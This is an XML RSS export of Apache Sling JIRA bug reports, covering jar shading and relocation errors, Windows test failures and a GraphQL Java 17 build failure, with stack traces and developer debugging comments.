<!--
RSS generated by JIRA (8.20.10#820010-sha1:ace47f9899e9ee25d7157d59aa17ab06aee30d3d) at Thu Oct 23 09:37:35 UTC 2025

It is possible to restrict the fields that are returned in this document by specifying the 'field' parameter in your request.
For example, to request only the issue key and summary append 'field=key&field=summary' to the URL of your request.
-->
<!-- If you wish to do custom client-side styling of RSS, uncomment this:
<?xml-stylesheet href="https://issues.apache.org/jira/styles/jiraxml2html.xsl" type="text/xsl"?>
-->
<rss version="0.92">
    <channel>
        <title>ASF JIRA</title>
        <link>https://issues.apache.org/jira/issues/?jql=project+%3D+%22SLING%22+AND+issuetype+%3D+Bug+ORDER+BY+key+DESC</link>
        <description>An XML representation of a search request</description>
                <language>en-uk</language>
                        <issue start="200" end="400" total="4707"/>
                <build-info>
            <version>8.20.10</version>
            <build-number>820010</build-number>
            <build-date>22-06-2022</build-date>
        </build-info>

<item>
            <title>[SLING-12032] Slf4j classes included and not relocated in the final jar</title>
                <link>https://issues.apache.org/jira/browse/SLING-12032</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;For some reason the following jars are pulled in and not relocated&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[INFO] Including org.slf4j:slf4j-api:jar:1.7.25 in the shaded jar.
[INFO] Including org.slf4j:jcl-over-slf4j:jar:1.7.25 in the shaded jar.
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This can lead to classpath conflicts and must be avoided. Relocating might work, but right now I don&apos;t see a good reason for shipping a copy of the slf4j so we should just filter out these packages.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13551430">SLING-12032</key>
            <summary>Slf4j classes included and not relocated in the final jar</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Wed, 20 Sep 2023 15:42:19 +0000</created>
                <updated>Mon, 25 Sep 2023 13:59:51 +0000</updated>
                            <resolved>Fri, 22 Sep 2023 13:39:27 +0000</resolved>
                                                    <fixVersion>Feature Model Content Extension 1.0.12</fixVersion>
                                    <component>Feature Model</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 5 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1khkw:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-12030] Invalid class name when trying to execute extension </title>
                <link>https://issues.apache.org/jira/browse/SLING-12030</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When trying to run a the latest master version I get the following error&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;ception in thread &quot;Thread-39&quot; java.lang.ClassFormatError: Illegal class name &quot;relocated-for-contentpackage/javax/jcr/RepositoryException&quot; in class file relocated-for-contentpackage/javax/jcr/RepositoryException
        at java.base/java.lang.ClassLoader.defineClass1(Native Method)
        at java.base/java.lang.ClassLoader.defineClass(ClassLoader.java:1022)
        at java.base/java.security.SecureClassLoader.defineClass(SecureClassLoader.java:174)
        at java.base/jdk.internal.loader.BuiltinClassLoader.defineClass(BuiltinClassLoader.java:800)
        at java.base/jdk.internal.loader.BuiltinClassLoader.findClassOnClassPathOrNull(BuiltinClassLoader.java:698)
        at java.base/jdk.internal.loader.BuiltinClassLoader.loadClassOrNull(BuiltinClassLoader.java:621)
        at java.base/jdk.internal.loader.BuiltinClassLoader.loadClass(BuiltinClassLoader.java:579)
        at java.base/jdk.internal.loader.ClassLoaders$AppClassLoader.loadClass(ClassLoaders.java:178)
        at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:527)
        at org.apache.sling.feature.extension.content.ContentHandler.buildExecutionPlan(ContentHandler.java:74)
        at org.apache.sling.feature.extension.content.ContentHandler.handle(ContentHandler.java:118)
        at org.apache.sling.feature.launcher.impl.FeatureProcessor.prepareLauncher(FeatureProcessor.java:196)
        at org.apache.sling.feature.launcher.impl.Bootstrap.runWithException(Bootstrap.java:157)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13551371">SLING-12030</key>
            <summary>Invalid class name when trying to execute extension </summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Wed, 20 Sep 2023 09:30:26 +0000</created>
                <updated>Mon, 25 Sep 2023 13:59:52 +0000</updated>
                            <resolved>Wed, 20 Sep 2023 15:03:28 +0000</resolved>
                                                    <fixVersion>Feature Model Content Extension 1.0.12</fixVersion>
                                    <component>Feature Model</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17767062" author="rombert" created="Wed, 20 Sep 2023 09:32:05 +0000"  >&lt;p&gt;The shade pattern was changed with &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-10405&quot; title=&quot;Update embedded jackrabbit vault to version 3.5.0&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-10405&quot;&gt;&lt;del&gt;SLING-10405&lt;/del&gt;&lt;/a&gt;, this is the likely cause.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13379464">SLING-10405</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 5 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1kh7s:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-12028] Content Deployment Extension tests fail on Windows</title>
                <link>https://issues.apache.org/jira/browse/SLING-12028</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[ERROR] org.apache.sling.feature.extension.content.ContentHandlerTest.testMultipleStartOrders  Time elapsed: 0.617 s  &amp;lt;&amp;lt;&amp;lt; FAILURE!
org.junit.ComparisonFailure: expected:&amp;lt;...t5731559958083209794[\]executedplans.file&amp;gt; but was:&amp;lt;...t5731559958083209794[/]executedplans.file&amp;gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13551291">SLING-12028</key>
            <summary>Content Deployment Extension tests fail on Windows</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Tue, 19 Sep 2023 20:19:50 +0000</created>
                <updated>Mon, 25 Sep 2023 13:59:54 +0000</updated>
                            <resolved>Wed, 20 Sep 2023 07:27:08 +0000</resolved>
                                                    <fixVersion>Feature Model Content Extension 1.0.12</fixVersion>
                                    <component>Feature Model</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 5 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1kgq0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-12027] GraphQL core fails to build with Java 17</title>
                <link>https://issues.apache.org/jira/browse/SLING-12027</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;1. Mockito fails to create mocks, probably due to old version&lt;br/&gt;
2. Pax-Exam tests time out&lt;/p&gt;</description>
                <environment></environment>
        <key id="13551203">SLING-12027</key>
            <summary>GraphQL core fails to build with Java 17</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Tue, 19 Sep 2023 09:03:21 +0000</created>
                <updated>Sun, 17 Dec 2023 08:53:49 +0000</updated>
                            <resolved>Wed, 27 Sep 2023 08:50:44 +0000</resolved>
                                                    <fixVersion>GraphQL Core 0.0.26</fixVersion>
                                    <component>GraphQL</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                                                                                <comments>
                            <comment id="17767174" author="schaefa" created="Wed, 20 Sep 2023 15:51:11 +0000"  >&lt;p&gt;The current PR for this ticket is: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-graphql-core/pull/38&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-graphql-core/pull/38&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Looking at the failure in the GraphQLServletIT.testPersistingInvalidQueries() is that the GraphQLServlet.doPostPersistedQuery() is failing the query validation and sets the Response Error Code to SC_BAD_REQUEST.&lt;br/&gt;
That said in the output I see that after looking for &apos;sling/nonexisting&apos; and then &apos;sling/servlet/errorhandler&apos; is failing.&lt;br/&gt;
After that I see that the org.apache.felix.http.jetty&lt;span class=&quot;error&quot;&gt;&amp;#91;org.eclipse.jetty.server.HttpOutput&amp;#93;&lt;/span&gt; is writing an Internal Server Error which is then returned to the client.&lt;/p&gt;

&lt;p&gt;So this is not a GraphQL issue but rather a testing setup issue.&lt;/p&gt;</comment>
                            <comment id="17767199" author="schaefa" created="Wed, 20 Sep 2023 17:03:26 +0000"  >&lt;p&gt;Here are some excerpts of the output:&lt;/p&gt;

&lt;p&gt;a) Where the invalid query is discovered:&lt;br/&gt;
Caused by: org.apache.sling.api.resource.ResourceNotFoundException: Resource at &apos;/graphql/two.gql/persisted&apos; not found: No resource found&lt;br/&gt;
at org.apache.sling.servlets.get.impl.DefaultGetServlet.doGet(DefaultGetServlet.java:288)&lt;br/&gt;
at org.apache.sling.api.servlets.SlingSafeMethodsServlet.mayService(SlingSafeMethodsServlet.java:266)&lt;br/&gt;
at org.apache.sling.api.servlets.SlingSafeMethodsServlet.service(SlingSafeMethodsServlet.java:342)&lt;br/&gt;
at org.apache.sling.api.servlets.SlingSafeMethodsServlet.service(SlingSafeMethodsServlet.java:374)&lt;br/&gt;
at org.apache.sling.graphql.core.schema.DefaultSchemaProvider.getSchema(DefaultSchemaProvider.java:67)&lt;br/&gt;
at org.apache.sling.graphql.core.schema.RankedSchemaProviders.getSchema(RankedSchemaProviders.java:58)&lt;br/&gt;
at org.apache.sling.graphql.core.engine.DefaultQueryExecutor.prepareSchemaDefinition(DefaultQueryExecutor.java:339)&lt;br/&gt;
... 61 more&lt;br/&gt;
org.apache.sling.graphql.core&lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.graphql.core.servlet.GraphQLServlet&amp;#93;&lt;/span&gt; : Is Query Valid: &apos;false&apos;&lt;br/&gt;
org.apache.sling.graphql.core&lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.graphql.core.servlet.GraphQLServlet&amp;#93;&lt;/span&gt; : Invalid GraphQL query: Schema provider failed&lt;br/&gt;
&#160;&lt;br/&gt;
b) Looking for sling/nonexisting&lt;br/&gt;
org.apache.sling.jcr.resource&lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.jcr.resource.internal.helper.jcr.JcrItemResourceFactory&amp;#93;&lt;/span&gt; : createResource: No JCR Item exists at path &apos;/apps/sling/nonexisting&apos;&lt;br/&gt;
org.apache.sling.resourceresolver&lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.resourceresolver.impl.helper.ResourceResolverControl&amp;#93;&lt;/span&gt; : Resource null /apps/sling/nonexisting&#160;&lt;br/&gt;
org.apache.sling.resourceresolver&lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.resourceresolver.impl.ResourceResolverImpl&amp;#93;&lt;/span&gt; : getResourceInternal: Cannot resolve path &apos;/apps/sling/nonexisting&apos; to a resource&lt;br/&gt;
&#160;&lt;br/&gt;
c) Looking for sling/servlet/errorhandler&lt;br/&gt;
org.apache.sling.jcr.resource&lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.jcr.resource.internal.helper.jcr.JcrItemResourceFactory&amp;#93;&lt;/span&gt; : createResource: No JCR Item exists at path &apos;/apps/sling/servlet/errorhandler&apos;&lt;br/&gt;
org.apache.sling.resourceresolver&lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.resourceresolver.impl.helper.ResourceResolverControl&amp;#93;&lt;/span&gt; : Resource null /apps/sling/servlet/errorhandler&#160;&lt;br/&gt;
org.apache.sling.resourceresolver&lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.resourceresolver.impl.ResourceResolverImpl&amp;#93;&lt;/span&gt; : getResourceInternal: Cannot resolve path &apos;/apps/sling/servlet/errorhandler&apos; to a resource&lt;br/&gt;
org.apache.sling.jcr.resource&lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.jcr.resource.internal.helper.jcr.JcrItemResourceFactory&amp;#93;&lt;/span&gt; : createResource: No JCR Item exists at path &apos;/apps/sling/servlet/errorhandler&apos;&lt;br/&gt;
org.apache.sling.servlets.resolver&lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.servlets.resolver.internal.SlingServletResolver&amp;#93;&lt;/span&gt; : Accepting servlet at &apos;/apps/sling/servlet/errorhandler.servlet&apos; as there are no configured execution paths.&lt;br/&gt;
org.apache.sling.jcr.resource&lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.jcr.resource.internal.helper.jcr.JcrItemResourceFactory&amp;#93;&lt;/span&gt; : createResource: No JCR Item exists at path &apos;/apps/sling/servlet/errorhandler.servlet&apos;&lt;br/&gt;
org.apache.sling.resourceresolver&lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.resourceresolver.impl.helper.ResourceResolverControl&amp;#93;&lt;/span&gt; : Resource null /apps/sling/servlet/errorhandler.servlet&#160;&lt;br/&gt;
org.apache.sling.resourceresolver&lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.resourceresolver.impl.ResourceResolverImpl&amp;#93;&lt;/span&gt; : getResourceInternal: Cannot resolve path &apos;/apps/sling/servlet/errorhandler.servlet&apos; to a resource&lt;br/&gt;
org.apache.sling.jcr.resource&lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.jcr.resource.internal.helper.jcr.JcrItemResourceFactory&amp;#93;&lt;/span&gt; : createResource: No JCR Item exists at path &apos;/libs/sling/servlet/errorhandler&apos;&lt;br/&gt;
org.apache.sling.resourceresolver&lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.resourceresolver.impl.helper.ResourceResolverControl&amp;#93;&lt;/span&gt; : Resolved Synthetic /libs/sling/servlet/errorhandler&lt;br/&gt;
&#160;&lt;br/&gt;
d) Writing out the Internal Server Error:&lt;br/&gt;
org.apache.felix.http.jetty&lt;span class=&quot;error&quot;&gt;&amp;#91;org.eclipse.jetty.server.HttpOutput&amp;#93;&lt;/span&gt; : write(array HeapByteBuffer@5a63afc1&lt;span class=&quot;error&quot;&gt;&amp;#91;p=0,l=50,c=512,r=50&amp;#93;&lt;/span&gt;={&amp;lt;&amp;lt;&amp;lt;&amp;lt;!DOCTYPE HTML PUBLIC &quot;-/...ETF//DTD HTML 2.0//EN&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt;\x00\x00\x00\x00\x00\x00\x00\x00\x00...\x00\x00\x00\x00\x00\x00\x00})&lt;br/&gt;
org.apache.felix.http.jetty&lt;span class=&quot;error&quot;&gt;&amp;#91;org.eclipse.jetty.server.HttpOutput&amp;#93;&lt;/span&gt; : write(array) s=OPEN,api=BLOCKING,sc=false,e=null aggregated !flush DirectByteBuffer@fd5949f&lt;span class=&quot;error&quot;&gt;&amp;#91;p=0,l=50,c=32768,r=50&amp;#93;&lt;/span&gt;={&amp;lt;&amp;lt;&amp;lt;&amp;lt;!DOCTYPE HTML PUBLIC &quot;-/...ETF//DTD HTML 2.0//EN&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt;\x00\x00\x00\x00\x00\x00\x00\x00\x00...\x00\x00\x00\x00\x00\x00\x00}&lt;br/&gt;
org.apache.felix.http.jetty&lt;span class=&quot;error&quot;&gt;&amp;#91;org.eclipse.jetty.server.HttpOutput&amp;#93;&lt;/span&gt; : write(array HeapByteBuffer@fd4c2d3&lt;span class=&quot;error&quot;&gt;&amp;#91;p=0,l=1,c=512,r=1&amp;#93;&lt;/span&gt;={&amp;lt;&amp;lt;&amp;lt;\n&amp;gt;&amp;gt;&amp;gt;!DOCTYPE ...\x00\x00\x00\x00\x00\x00\x00})&lt;br/&gt;
...&lt;br/&gt;
org.apache.felix.http.jetty&lt;span class=&quot;error&quot;&gt;&amp;#91;org.eclipse.jetty.server.HttpOutput&amp;#93;&lt;/span&gt; : write(array HeapByteBuffer@516d7550&lt;span class=&quot;error&quot;&gt;&amp;#91;p=0,l=1,c=512,r=1&amp;#93;&lt;/span&gt;={&amp;lt;&amp;lt;&amp;lt; &amp;gt;&amp;gt;&amp;gt;00tle&amp;gt;PE ...\x00\x00\x00\x00\x00\x00\x00})&lt;br/&gt;
org.apache.felix.http.jetty&lt;span class=&quot;error&quot;&gt;&amp;#91;org.eclipse.jetty.server.HttpOutput&amp;#93;&lt;/span&gt; : write(array) s=OPEN,api=BLOCKING,sc=false,e=null aggregated !flush DirectByteBuffer@fd5949f&lt;span class=&quot;error&quot;&gt;&amp;#91;p=0,l=76,c=32768,r=76&amp;#93;&lt;/span&gt;={&amp;lt;&amp;lt;&amp;lt;&amp;lt;!DOCTYPE HTML PUBLIC &quot;-/...tml&amp;gt;\n&amp;lt;head&amp;gt;\n&amp;lt;title&amp;gt;500 &amp;gt;&amp;gt;&amp;gt;\x00\x00\x00\x00\x00\x00\x00\x00\x00...\x00\x00\x00\x00\x00\x00\x00}&lt;br/&gt;
org.apache.felix.http.jetty&lt;span class=&quot;error&quot;&gt;&amp;#91;org.eclipse.jetty.server.HttpOutput&amp;#93;&lt;/span&gt; : write(array HeapByteBuffer@6e6d5b79&lt;span class=&quot;error&quot;&gt;&amp;#91;p=0,l=21,c=512,r=21&amp;#93;&lt;/span&gt;={&amp;lt;&amp;lt;&amp;lt;Internal Server Error&amp;gt;&amp;gt;&amp;gt; &quot;-//IETF...\x00\x00\x00\x00\x00\x00\x00})&lt;br/&gt;
...&lt;/p&gt;

&lt;p&gt;org.apache.felix.http.jetty&lt;span class=&quot;error&quot;&gt;&amp;#91;org.eclipse.jetty.server.HttpChannel&amp;#93;&lt;/span&gt; : COMMIT for /graphql/two.gql/persisted on HttpChannelOverHttp@5404618e{s=HttpChannelState@6a0b6256&lt;/p&gt;
{s=HANDLING rs=BLOCKING os=COMMITTED is=IDLE awp=false se=false i=true al=0}
&lt;p&gt;,r=1,c=false/false,a=HANDLING,uri=&lt;a href=&quot;http://localhost:49290/graphql/two.gql/persisted,age=66&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;http://localhost:49290/graphql/two.gql/persisted,age=66&lt;/a&gt;}&lt;br/&gt;
500 null HTTP/1.1&lt;br/&gt;
Content-Type: text/html;charset=utf-8&lt;/p&gt;</comment>
                            <comment id="17767252" author="schaefa" created="Wed, 20 Sep 2023 19:22:26 +0000"  >&lt;p&gt;I found the cause of the issue. During the handling of the error the&#160;DefaultErrorHandlerServlet.service() (line 70) is trying to find the error code but it is not found. So it seems there is a disconnect between when that error code is set in SlingServletResolver.handleError() line 387 and when it is looked up.&#160;&lt;/p&gt;</comment>
                            <comment id="17768746" author="rombert" created="Mon, 25 Sep 2023 15:19:38 +0000"  >&lt;p&gt;Thanks for looking in-depth &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=andysch&quot; class=&quot;user-hover&quot; rel=&quot;andysch&quot;&gt;andysch&lt;/a&gt;. I am afraid I can&apos;t help any longer right now, but maybe someone with both core Sling and GraphQL knowledge, like &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=radu&quot; class=&quot;user-hover&quot; rel=&quot;radu&quot;&gt;radu&lt;/a&gt; or &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=bdelacretaz&quot; class=&quot;user-hover&quot; rel=&quot;bdelacretaz&quot;&gt;bdelacretaz&lt;/a&gt;, can help.&lt;/p&gt;</comment>
                            <comment id="17768749" author="radu.cotescu" created="Mon, 25 Sep 2023 15:28:13 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=andysch&quot; class=&quot;user-hover&quot; rel=&quot;andysch&quot;&gt;andysch&lt;/a&gt;, could it be that the tests are running with relatively old Sling Engine and Sling Servlet Resolver bundles? Have you tried updating those?&lt;/p&gt;</comment>
                            <comment id="17768921" author="schaefa" created="Mon, 25 Sep 2023 21:57:25 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=radu&quot; class=&quot;user-hover&quot; rel=&quot;radu&quot;&gt;radu&lt;/a&gt; Does not do the trick. I upgraded to the latest Engine, Servlets Resolver and some more and it still breaks the same way. It actually makes it even rose because now additional IT tests fail.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
